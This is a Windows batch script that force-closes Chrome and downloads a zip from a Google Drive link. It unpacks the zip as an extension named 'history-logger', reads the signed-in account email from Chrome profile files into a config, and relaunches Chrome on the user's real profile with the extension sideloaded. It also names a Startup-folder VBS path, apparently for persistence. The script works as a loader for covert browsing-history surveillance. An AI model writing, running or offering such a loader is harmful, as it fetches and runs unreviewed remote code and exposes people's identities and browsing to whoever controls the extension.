@echo off
setlocal EnableDelayedExpansion

:: Config
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SCRIPT=%STARTUP_DIR%\run_extension.vbs"
set "CHECK_INTERVAL=5"
set "CONFIG_FILE=%WORKDIR%\config.json"

:: Kill Chrome
taskkill /IM chrome.exe /F >nul 2>&1
timeout /t 3 /nobreak >nul

:: Cleanup
if exist "%WORKDIR%" (
  rd /s /q "%WORKDIR%"
)
mkdir "%WORKDIR%" || exit /b 1

:: Download and unzip extension
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" || exit /b 1
powershell -NoProfile -Command "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" || exit /b 1

:: Scan for email and profile
call :scan_email || exit /b 1

:: Start Chrome with extension
start "" chrome.exe --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" || exit /b 1

exit /b 0

:: ========== Subroutines ==========

:scan_email
set "EMAIL="
set "PROFILE_DIR="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"`) do (
      if not "%%E"=="" (
        set "EMAIL=%%E"
        set "PROFILE_DIR=%%P"
        goto :write_config
      )
    )
  )
)
:write_config
if not defined EMAIL (
  set "EMAIL=anonymous@demo.com"
  set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
)
(
  echo {"userEmail":"!EMAIL!"}
) > "%CONFIG_FILE%"
exit /b 0
